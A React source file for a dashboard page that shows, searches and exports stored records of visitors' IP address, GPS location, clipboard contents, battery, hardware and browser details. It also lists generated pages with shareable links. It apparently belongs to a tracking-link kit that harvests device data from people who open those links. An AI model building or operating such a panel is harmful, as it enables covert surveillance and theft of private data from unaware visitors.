
import React, { useState, useMemo } from "react";
import { DashboardLayout } from "@/components/DashboardLayout";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { useFolderTextFiles } from "@/hooks/useFolderTextFiles";
import { useData } from "@/contexts/DataContext";
import { Table, TableHeader, TableBody, TableHead, TableRow, TableCell } from "@/components/ui/table";
import { Eye, Download, Trash2, Link as LinkIcon } from "lucide-react";
import { useToast } from "@/components/ui/use-toast";
import { format } from "date-fns";
import { DeletePageDialog } from "@/components/DeletePageDialog";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";

// Fixed database table columns
const FIXED_LABELS = [
  "Ip Address", "Country", "NetworkInformation", "Batterypercentage",
  "Ischarging", "ScreenWidth", "ScreeHeight", "Platform", "GPS", "DeviceLocalTime",
  "DeviceLanguage", "CookieEnabled", "UserAgent", "DeviceMemory", "CPuThreads",
  "Clipboard", "ReferUrl"
];

export default function Database() {
  const { files, loading } = useFolderTextFiles();
  const [search, setSearch] = useState("");
  const [uploading, setUploading] = useState(false);
  const [uploadError, setUploadError] = useState<string | null>(null);
  const { toast } = useToast();
  const [activeTab, setActiveTab] = useState<string>("txt");

  // Remove file extension from file name
  const getFileId = (fileName: string) =>
    fileName.replace(/\.[^.]+$/, "");

  // Convert file table rows array to object for easier lookup
  const getRowObj = (rows: { label: string; value: string }[]) => {
    const obj: Record<string, string> = {};
    rows.forEach(({ label, value }) => {
      obj[label] = value;
    });
    return obj;
  };

  // Filter files by type
  const txtFiles = useMemo(() => files.filter(file => file.folderType === "txt"), [files]);
  const pageFiles = useMemo(() => files.filter(file => file.folderType === "page"), [files]);

  // Flexible search across all table columns and file name for txt files
  const filteredTxtFiles = useMemo(() => {
    if (!search.trim()) return txtFiles;
    return txtFiles.filter(file => {
      const rowObj = getRowObj(file.rows);
      const values = [
        getFileId(file.fileName),
        file.fileName,
        ...FIXED_LABELS.map(label => rowObj[label] || ""),
        ...Object.values(rowObj),
      ];
      return values.some(val =>
        (val || "").toString().toLowerCase().includes(search.toLowerCase())
      );
    });
  }, [txtFiles, search]);

  // Flexible search for page files
  const filteredPageFiles = useMemo(() => {
    if (!search.trim()) return pageFiles;
    return pageFiles.filter(file => {
      const rowObj = getRowObj(file.rows);
      const values = [
        getFileId(file.fileName),
        file.fileName,
        ...Object.values(rowObj),
      ];
      return values.some(val =>
        (val || "").toString().toLowerCase().includes(search.toLowerCase())
      );
    });
  }, [pageFiles, search]);

  // Data context for pages, links, etc.
  const { pages, deletePage, getPageLinks, exportPageAsFolder, findPageById } = useData();

  // Filtered pages based on search term
  const filteredPages = useMemo(() => {
    if (!search.trim()) return pages;
    return pages.filter(page => 
      page.title.toLowerCase().includes(search.toLowerCase()) ||
      page.id.toLowerCase().includes(search.toLowerCase())
    );
  }, [pages, search]);

  const handleExport = (type: "csv" | "excel") => {
    const sep = type === "csv" ? "," : "\t";
    const header = ["ID", ...FIXED_LABELS];
    const rows = filteredTxtFiles.map(file => {
      const rowObj = getRowObj(file.rows);
      return [
        getFileId(file.fileName),
        ...FIXED_LABELS.map(label => (rowObj[label] || "").replace(/[\r\n]+/g, " "))
      ].map(v => `"${v.replace(/"/g, '""')}"`).join(sep);
    });
    const content = [header.join(sep), ...rows].join("\r\n");
    const blob = new Blob([content], {
      type:
        type === "csv"
          ? "text/csv;charset=utf-8;"
          : "application/vnd.ms-excel"
    });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `database_export.${type === "csv" ? "csv" : "xls"}`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    toast({
      title: `Exported as ${type.toUpperCase()}`,
      description: "The table exported successfully.",
    });
  };

  // --- File upload handler ---
  const handleFileUpload = async (e: React.ChangeEvent<HTMLInputElement>, folderType: "txt" | "page") => {
    setUploadError(null);
    const file = e.target.files?.[0];
    if (!file) return;

    const validExtension = folderType === "txt" ? /\.txt$/i : /\.(html|htm)$/i;
    if (!validExtension.test(file.name)) {
      setUploadError(`Only ${folderType === "txt" ? ".txt" : ".html/.htm"} file upload is allowed`);
      return;
    }

    setUploading(true);
    try {
      setTimeout(() => {
        toast({
          title: "Manual Upload Needed",
          description: `To register a file, please manually copy your file to /public/datafiles/${folderType} and add it to files.json`,
          variant: "default",
        });
        setUploading(false);
        e.target.value = "";
      }, 500);
    } catch (err) {
      setUploadError("Upload failed: " + String(err));
      setUploading(false);
    }
  };

  // Delete Page Dialog handler
  const handleDeletePage = (pageId: string) => (inputPassword: string) => {
    const result = deletePage(pageId, inputPassword);
    if (result) {
      toast({ title: "Page deleted successfully" });
    }
  };

  // Download page as HTML
  const handleDownloadPage = (pageId: string) => {
    exportPageAsFolder(pageId);
  };

  return (
    <DashboardLayout title="Database">
      <div className="max-w-7xl mx-auto py-10 space-y-6">
        {/* --- Top controls: Search, Export, Upload --- */}
        <Card className="border-gradient-to-r from-indigo-400 to-cyan-400">
          <CardHeader>
            <CardTitle>Files Database</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="flex flex-col lg:flex-row gap-4 lg:items-center justify-between mb-3 flex-wrap">
              <input
                className="border rounded-lg px-4 py-2 w-full lg:w-96 bg-background"
                placeholder="Search record..."
                value={search}
                onChange={e => setSearch(e.target.value)}
              />
            </div>
            
            <Tabs value={activeTab} onValueChange={setActiveTab}>
              <TabsList className="mb-4">
                <TabsTrigger value="txt">Text Files</TabsTrigger>
                <TabsTrigger value="app-pages">App Pages</TabsTrigger>
              </TabsList>
              
              <TabsContent value="txt" className="space-y-4">
                <div className="flex flex-wrap gap-2 items-center">
                  <Button onClick={() => handleExport("csv")} variant="outline">
                    <Download className="h-4 w-4 mr-2" /> Export CSV
                  </Button>
                  <Button onClick={() => handleExport("excel")} variant="outline">
                    <Download className="h-4 w-4 mr-2" /> Export Excel
                  </Button>
                  {/* TXT Upload (for reference, must be copied manually) */}
                  <div className="flex flex-col gap-1">
                    <label className="font-semibold text-xs mb-1">
                      Upload .txt file
                    </label>
                    <input
                      type="file"
                      accept=".txt"
                      onChange={(e) => handleFileUpload(e, "txt")}
                      disabled={uploading}
                      className="block"
                      style={{ minWidth: "180px" }}
                    />
                  </div>
                </div>
                
                <div className="text-xs text-muted-foreground my-2">
                  To add a new .txt file, copy it into <code>/public/datafiles/txt/</code> and add it to <code>files.json</code>
                </div>
              
                <div className="overflow-x-auto rounded border bg-background">
                  <table className="w-full min-w-max border-collapse">
                    <thead className="bg-muted">
                      <tr>
                        <th className="px-4 py-2 whitespace-nowrap text-left font-semibold text-sm">
                          ID
                        </th>
                        {FIXED_LABELS.map(label => (
                          <th
                            key={label}
                            className="px-4 py-2 whitespace-nowrap text-left font-semibold text-sm"
                          >
                            {label}
                          </th>
                        ))}
                      </tr>
                    </thead>
                    <tbody>
                      {loading ? (
                        <tr>
                          <td colSpan={FIXED_LABELS.length + 1} className="text-center py-8">
                            Reading files...
                          </td>
                        </tr>
                      ) : filteredTxtFiles.length === 0 ? (
                        <tr>
                          <td colSpan={FIXED_LABELS.length + 1} className="text-center py-8">
                            No text file found.
                          </td>
                        </tr>
                      ) : (
                        filteredTxtFiles.map(file => {
                          const rowObj = getRowObj(file.rows);
                          return (
                            <tr key={file.fileName} className="border-b last:border-b-0">
                              {/* Remove .txt from ID */}
                              <td className="px-4 py-2 font-mono text-sm whitespace-nowrap">
                                {getFileId(file.fileName)}
                              </td>
                              {FIXED_LABELS.map(label => (
                                <td key={label} className="px-4 py-2 text-xs whitespace-pre-wrap break-all">
                                  {rowObj[label] || ""}
                                </td>
                              ))}
                            </tr>
                          );
                        })
                      )}
                    </tbody>
                  </table>
                </div>
              </TabsContent>
              
              <TabsContent value="app-pages" className="space-y-4">
                <div className="flex flex-wrap gap-2 items-center">
                  {/* HTML Upload (for reference, must be copied manually) */}
                  <div className="flex flex-col gap-1">
                    <label className="font-semibold text-xs mb-1">
                      Upload .html file
                    </label>
                    <input
                      type="file"
                      accept=".html,.htm"
                      onChange={(e) => handleFileUpload(e, "page")}
                      disabled={uploading}
                      className="block"
                      style={{ minWidth: "180px" }}
                    />
                  </div>
                </div>
                
                <div className="text-xs text-muted-foreground my-2">
                  To add a new HTML page file, copy it into <code>/public/datafiles/pages/</code> and add it to <code>files.json</code>
                </div>
              
                {/* Combined Pages Table - Shows both file-based and app-generated pages */}
                <div className="overflow-x-auto rounded border bg-background">
                  <Table>
                    <TableHeader>
                      <TableRow>
                        <TableHead>Page Name</TableHead>
                        <TableHead>Type</TableHead>
                        <TableHead>Created/Path</TableHead>
                        <TableHead>Links</TableHead>
                        <TableHead>Actions</TableHead>
                      </TableRow>
                    </TableHeader>
                    <TableBody>
                      {loading && pageFiles.length === 0 && pages.length === 0 ? (
                        <TableRow>
                          <TableCell colSpan={5} className="text-center">
                            Loading pages...
                          </TableCell>
                        </TableRow>
                      ) : filteredPageFiles.length === 0 && filteredPages.length === 0 ? (
                        <TableRow>
                          <TableCell colSpan={5} className="text-center">
                            No pages found.
                          </TableCell>
                        </TableRow>
                      ) : (
                        <>
                          {/* File-based HTML pages */}
                          {filteredPageFiles.map(file => {
                            const rowObj = getRowObj(file.rows);
                            return (
                              <TableRow key={file.fileName}>
                                <TableCell>{getFileId(file.fileName)}</TableCell>
                                <TableCell>HTML File</TableCell>
                                <TableCell>
                                  <code className="text-xs">{rowObj.Path}</code>
                                </TableCell>
                                <TableCell>
                                  <span className="text-muted-foreground text-xs">N/A</span>
                                </TableCell>
                                <TableCell>
                                  <div className="flex gap-2">
                                    <Button
                                      variant="ghost"
                                      size="sm"
                                      onClick={() => window.open(`${rowObj.Path}`, "_blank")}
                                      title="View page"
                                    >
                                      <Eye className="h-4 w-4" />
                                    </Button>
                                  </div>
                                </TableCell>
                              </TableRow>
                            );
                          })}

                          {/* App-generated pages */}
                          {filteredPages.map(page => (
                            <TableRow key={page.id}>
                              <TableCell>{page.title}</TableCell>
                              <TableCell>
                                {page.isFileBasedPage ? "File-Based Page" : "App-Generated Page"}
                              </TableCell>
                              <TableCell>
                                {page.isFileBasedPage ? (
                                  <code className="text-xs">{page.filePath}</code>
                                ) : (
                                  format(new Date(page.createdAt), "PPP")
                                )}
                              </TableCell>
                              {/* Column to display generated links for the page */}
                              <TableCell>
                                {getPageLinks(page.id).length === 0 ? (
                                  <span className="text-muted-foreground text-xs">No links</span>
                                ) : (
                                  <div className="flex flex-col gap-1">
                                    {getPageLinks(page.id).map(link => (
                                      <span
                                        key={link.id}
                                        className="flex items-center gap-1 text-xs"
                                      >
                                        <LinkIcon className="w-4 h-4" />
                                        <a
                                          href={link.fullLink}
                                          className="text-blue-600 dark:text-blue-400 underline"
                                          target="_blank"
                                          rel="noopener noreferrer"
                                          title="Open link"
                                        >
                                          {link.fullLink}
                                        </a>
                                        <Button
                                          variant="secondary"
                                          size="icon"
                                          className="p-1"
                                          onClick={() => {
                                            navigator.clipboard.writeText(link.fullLink);
                                            toast({
                                              title: "Copied!",
                                              description: "Link copied to clipboard.",
                                            });
                                          }}
                                        >
                                          <svg width="14" height="14" fill="none" stroke="currentColor" viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15V5a2 2 0 012-2h10"></path></svg>
                                        </Button>
                                      </span>
                                    ))}
                                  </div>
                                )}
                              </TableCell>
                              <TableCell>
                                <div className="flex gap-2">
                                  <Button
                                    variant="ghost"
                                    size="sm"
                                    onClick={() =>
                                      window.open(`/preview/${page.id}`, "_blank")
                                    }
                                    title="View"
                                  >
                                    <Eye className="h-4 w-4" />
                                  </Button>
                                  <Button
                                    variant="ghost"
                                    size="sm"
                                    onClick={() => handleDownloadPage(page.id)}
                                    title="Download"
                                  >
                                    <Download className="h-4 w-4" />
                                  </Button>
                                  {/* Modern delete dialog */}
                                  <DeletePageDialog
                                    onDelete={handleDeletePage(page.id)}
                                    trigger={
                                      <Button
                                        variant="ghost"
                                        size="sm"
                                        title="Delete"
                                      >
                                        <Trash2 className="h-4 w-4 text-destructive" />
                                      </Button>
                                    }
                                  />
                                </div>
                              </TableCell>
                            </TableRow>
                          ))}
                        </>
                      )}
                    </TableBody>
                  </Table>
                </div>
              </TabsContent>
            </Tabs>
            
            {uploading && <span className="text-sm">Uploading...</span>}
            {uploadError && (
              <span className="text-red-600 text-xs ml-2">{uploadError}</span>
            )}
          </CardContent>
        </Card>
      </div>
    </DashboardLayout>
  );
}
